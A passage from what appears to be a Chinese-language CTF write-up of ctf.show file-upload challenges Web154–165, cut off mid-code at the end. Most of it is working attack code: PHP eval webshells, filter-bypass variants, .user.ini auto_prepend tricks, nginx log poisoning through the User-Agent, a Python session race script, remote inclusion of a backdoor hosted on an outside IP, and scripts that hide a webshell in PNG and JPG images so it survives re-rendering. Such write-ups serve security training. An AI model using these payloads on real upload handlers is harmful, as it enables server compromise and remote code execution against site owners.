(表达式)?&gt;</code></p></blockquote><p>这里把1.txt的内容改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fdac7c8/image-20220412163101395.png" alt="image-20220412163101395"></p><p>上传成功，蚁剑连接 flag在老地方</p><h2 id="Web155"><a href="#Web155" class="headerlink" title="Web155"></a>Web155</h2><p>同web154</p><h2 id="Web156"><a href="#Web156" class="headerlink" title="Web156"></a>Web156</h2><p>先用web154的方法试下</p><p>发现1.txt无法上传</p><p>用二分法发现是[]被过滤 改为{}成功绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST&#123;1&#125;);?</span><br></pre></td></tr></table></figure><p><img src="/posts/fdac7c8/image-20220412165955739.png" alt="image-20220412165955739"></p><h2 id="Web157"><a href="#Web157" class="headerlink" title="Web157"></a>Web157</h2><p>老样子先上传.user.ini</p><p>发现1.txt没有办法上传</p><p>这里过滤了[]和{}</p><p>这里就换一个函数</p><blockquote><p>array_pop</p><p>array_pop — 弹出数组最后一个单元（出栈）</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_pop</span>(<span class="variable">$_POST</span>)) <span class="meta">?&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># 这里array_pop的返回值正好是post传出的值 </span></span><br></pre></td></tr></table></figure><p>利用这个函数我们就可以通过文件上传再进行命令执行从而获取到flag</p><p>这里还对;进行了拦截 但是没关系 php结束的;是可以省略的</p><p><img src="/posts/fdac7c8/image-20220413091144516.png" alt="image-20220413091144516"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># post传参</span></span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ../flag.php&quot;</span>);</span><br><span class="line"><span class="comment"># 源代码拿到flag</span></span><br></pre></td></tr></table></figure><h2 id="Web158"><a href="#Web158" class="headerlink" title="Web158"></a>Web158</h2><p>同web157</p><h2 id="Web159"><a href="#Web159" class="headerlink" title="Web159"></a>Web159</h2><p>老样子先上传.user.ini</p><p>这里过滤了（）</p><p>这里利用include包含日志文件，在日志文件中传马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span> <span class="string">&#x27;var/log/nginx/access.log&#x27;</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 这里对log 进行了过滤</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span> <span class="string">&#x27;var/lo&#x27;</span>.<span class="string">&#x27;g/nginx/access.lo&#x27;</span>.<span class="string">&#x27;g&#x27;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过user-agent传入一句话 从而写进日志</p><p><img src="/posts/fdac7c8/image-20220414000750535.png" alt="image-20220414000750535"></p><p>蚁剑连接 xxx.ctf.show&#x2F;upload</p><h2 id="Web160"><a href="#Web160" class="headerlink" title="Web160"></a>Web160</h2><p>老样子先上传.user.ini</p><p>这里过滤了空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里把空格换成0d换行符或者直接去掉空格</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传成功接下来 利用ua传入木马</p><p>蚁剑连接拿到flag</p><h2 id="Web161"><a href="#Web161" class="headerlink" title="Web161"></a>Web161</h2><p>这里对文件内容进行了检测</p><p>在文件中添加文件头GIF98a</p><p><img src="/posts/fdac7c8/image-20220415234148034.png" alt="image-20220415234148034"></p><p><img src="/posts/fdac7c8/image-20220415234205841.png" alt="image-20220415234205841"></p><p>ua传入木马 蚁剑连接拿到flag</p><h2 id="Web162"><a href="#Web162" class="headerlink" title="Web162"></a>Web162</h2><p>这里利用的是session条件竞争</p><p>首先先用161的方法上传.user.ini</p><p>这里对文件内容中的.进行了过滤</p><p>所以要包含一个不含.的文件</p><p><img src="/posts/fdac7c8/image-20220416000207449.png" alt="image-20220416000207449"></p><p>上传txt</p><p><img src="/posts/fdac7c8/image-20220416000325392.png" alt="image-20220416000325392"></p><p>这里用羽师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://266c4d44-1aff-478e-b173-903762efabcb.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://266c4d44-1aff-478e-b173-903762efabcb.challenge.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p>最后跑了半天没做出来<br>最后跑了半天没做出来</p><p>还有一个简单的方法但是需要一台VPS</p><blockquote><p>IP转长地址 <a href="https://www.bejson.com/convert/ip2int/">https://www.bejson.com/convert/ip2int/</a></p></blockquote><p>要在ip地址下的index.html中写入后门代码</p><p>利用远程包含IP转换地址后门调用执行</p><p>.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=png</span><br></pre></td></tr></table></figure><p>png</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&#x27;http://1696798202/&#x27;?&gt;</span><br></pre></td></tr></table></figure><h2 id="Web163"><a href="#Web163" class="headerlink" title="Web163"></a>Web163</h2><p>可是使用条件竞争</p><p>也可以使用长地址绕过</p><p>直接在配置文件中包含长地址</p><p>.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=http://1696798202/</span><br></pre></td></tr></table></figure><h2 id="Web164"><a href="#Web164" class="headerlink" title="Web164"></a>Web164</h2><p>这题主要考察png图片的二次渲染</p><p>利用脚本生成一个可以绕过二次渲染的图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>点击查看图片</p><p>使用hackbar</p><p><img src="/posts/fdac7c8/image-20220421152538585.png" alt="image-20220421152538585"></p><p>下载图片到本地用notpad++打开拿到flag</p><h2 id="Web165"><a href="#Web165" class="headerlink" title="Web165"></a>Web165</h2><p>这个题是jpg图片二次渲染绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ 